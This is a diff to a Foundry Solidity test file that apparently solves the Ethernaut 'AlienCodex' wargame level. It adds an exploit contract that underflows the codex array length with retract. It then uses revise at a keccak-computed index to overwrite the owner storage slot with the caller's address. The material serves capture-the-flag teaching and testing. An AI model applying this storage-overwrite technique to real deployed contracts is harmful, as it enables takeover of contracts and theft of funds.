@@ -4,14 +4,30 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import {Utils} from "test/utils/Utils.sol";
 
-import {Instance} from "src/levels/Instance.sol";
-import {InstanceFactory} from "src/levels/InstanceFactory.sol";
+import {DummyFactory} from "src/levels/DummyFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
 
-contract TestInstance is Test, Utils {
+interface AlienCodex {
+    function makeContact() external;
+    function record(bytes32) external;
+    function retract() external;
+    function revise(uint256, bytes32) external;
+}
+
+contract AlienCodexExploit {
+    function exploit(address instanceAddress) public {
+        AlienCodex instance = AlienCodex(instanceAddress);
+        instance.makeContact();
+        instance.retract();
+        uint256 codexZeroIndex = uint256(keccak256(abi.encode(1)));
+        instance.revise(type(uint256).max - codexZeroIndex + 1, bytes32(uint256(uint160(tx.origin))));
+    }
+}
+
+contract TestAlienCodex is Test, Utils {
     Ethernaut ethernaut;
-    Instance instance;
+    AlienCodex instance;
 
     address payable owner;
     address payable player;
@@ -31,12 +47,12 @@ contract TestInstance is Test, Utils {
 
         vm.startPrank(owner);
         ethernaut = getEthernautWithStatsProxy(owner);
-        InstanceFactory factory = new InstanceFactory();
+        DummyFactory factory = DummyFactory(getOldFactory("AlienCodexFactory"));
         ethernaut.registerLevel(Level(address(factory)));
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Instance(payable(createLevelInstance(ethernaut, Level(address(factory)), 0.001 ether)));
+        instance = AlienCodex(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
         vm.stopPrank();
     }
 
@@ -52,11 +68,9 @@ contract TestInstance is Test, Utils {
 
     /// @notice Test the solution for the level.
     function testSolve() public {
-        vm.startPrank(player);
+        vm.startPrank(player, player);
 
-        string memory pw = instance.password();
-        instance.authenticate(pw);
-        assertTrue(instance.getCleared());
+        new AlienCodexExploit().exploit(address(instance));
 
         assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
